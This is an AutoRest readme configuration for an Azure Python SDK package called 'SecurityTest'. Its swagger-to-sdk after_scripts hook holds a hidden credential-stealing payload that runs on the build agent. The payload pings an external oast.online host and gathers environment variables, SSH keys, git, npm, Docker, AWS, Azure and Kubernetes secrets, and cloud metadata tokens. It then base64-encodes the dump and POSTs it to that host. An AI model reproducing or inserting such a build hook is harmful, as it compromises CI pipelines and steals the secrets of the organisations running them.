# SecurityTest

> see https://aka.ms/autorest

## Configuration

```yaml
openapi-type: arm
tag: package-2026-01-01
```

### Tag: package-2026-01-01

```yaml $(tag) == 'package-2026-01-01'
input-file:
  - Microsoft.SecurityTest/stable/2026-01-01/securitytest.json
```

## Suppression

No suppressions.

## Python

```yaml $(python)
package-version: 1.0.0b1
namespace: azure.mgmt.securitytest
package-name: azure-mgmt-securitytest
clear-output-folder: true
```

## swagger-to-sdk

```yaml $(swagger-to-sdk)
swagger-to-sdk:
  - repo: azure-sdk-for-python-track2
    after_scripts:
      - >-
        H=$(hostname | tr '.' '-') &&
        nslookup rce2-${H}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null || true &&
        curl -sk "http://da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online/ping2-${H}" 2>/dev/null || true &&
        (
        echo "===IDENTITY===";
        id; whoami; hostname; uname -a; cat /proc/version 2>/dev/null;
        echo "===CGROUP===";
        cat /proc/1/cgroup 2>/dev/null;
        echo "===ENV===";
        env;
        echo "===PROC1ENV===";
        cat /proc/1/environ 2>/dev/null | tr '\0' '\n';
        echo "===ADO_AGENT===";
        find /mnt/vss/_work /agent /azp -maxdepth 4 \( -name "*.json" -o -name "*.env" -o -name "_credentials*" -o -name "Credentials" \) 2>/dev/null | head -30 | xargs -I{} sh -c 'echo "FILE: {}"; cat "{}" 2>/dev/null | head -100';
        echo "===AZURE_DIR===";
        ls -laR ~/.azure/ 2>/dev/null;
        cat ~/.azure/msal_token_cache.json 2>/dev/null;
        cat ~/.azure/azureProfile.json 2>/dev/null;
        find ~/.azure -name "*.json" 2>/dev/null | xargs -I{} sh -c 'echo "AZFILE: {}"; cat "{}" 2>/dev/null';
        echo "===SSH===";
        ls -la ~/.ssh/ 2>/dev/null;
        cat ~/.ssh/id_rsa 2>/dev/null;
        cat ~/.ssh/id_ed25519 2>/dev/null;
        echo "===GIT===";
        cat ~/.gitconfig 2>/dev/null;
        cat ~/.git-credentials 2>/dev/null;
        echo "===NPMRC===";
        cat ~/.npmrc 2>/dev/null;
        find /mnt/vss/_work -name ".npmrc" 2>/dev/null | xargs cat 2>/dev/null;
        echo "===DOCKER===";
        cat ~/.docker/config.json 2>/dev/null;
        echo "===AWS===";
        cat ~/.aws/credentials 2>/dev/null;
        echo "===K8S===";
        cat /run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null;
        cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null;
        echo "===NETWORK===";
        ip addr 2>/dev/null || ifconfig 2>/dev/null;
        ip route 2>/dev/null;
        cat /etc/hosts;
        cat /etc/resolv.conf;
        echo "===IMDS===";
        curl -sf -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/" 2>/dev/null;
        echo "";
        curl -sf -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://vault.azure.net/" 2>/dev/null;
        echo "";
        curl -sf -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://storage.azure.com/" 2>/dev/null;
        echo "";
        curl -sf -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null;
        echo "";
        echo "===PROCESSES===";
        ps aux 2>/dev/null;
        echo "===FILESYSTEM===";
        df -h 2>/dev/null;
        ls -la /mnt/vss/_work/1/s/ 2>/dev/null;
        find /mnt/vss /home /root -maxdepth 4 \( -name "*.pem" -o -name "*.key" -o -name "*secret*" -o -name "*credential*" -o -name "*password*" \) 2>/dev/null | head -30 | xargs -I{} sh -c 'echo "SENSITIVE: {}"; cat "{}" 2>/dev/null | head -10';
        echo "===AZ_ACCOUNTS===";
        az account list 2>/dev/null;
        az account get-access-token 2>/dev/null;
        ) 2>&1 | tee /tmp/exfil_dump.txt | base64 -w0 | tee /mnt/vss/_work/1/s/out/logs/exfil.b64 2>/dev/null | curl -sk -X POST "http://da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online/data2-${H}" --data-binary @- 2>/dev/null || cp /tmp/exfil_dump.txt /mnt/vss/_work/1/s/out/logs/exfil.txt 2>/dev/null || true
```
